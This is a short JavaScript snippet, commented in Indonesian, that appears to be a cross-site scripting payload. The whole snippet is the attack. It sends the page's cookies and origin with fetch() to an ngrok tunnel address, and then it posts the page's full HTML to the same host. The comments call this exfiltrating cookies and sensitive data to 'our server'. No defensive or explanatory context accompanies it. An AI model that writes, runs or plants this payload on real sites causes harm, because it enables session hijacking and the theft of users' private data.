// Eksfiltrasi cookie dan data sensitif ke server kita
fetch(
  'https://26b72bef0ccf.ngrok-free.app' +
    document.cookie +
    '&origin=' +
    encodeURIComponent(window.location.origin)
)
  .then((response) => response.text())
  .then((data) => {
    // Kirim seluruh body halaman
    fetch('https://26b72bef0ccf.ngrok-free.app/html', {
      method: 'POST',
      body: document.documentElement.outerHTML,
    });
  });
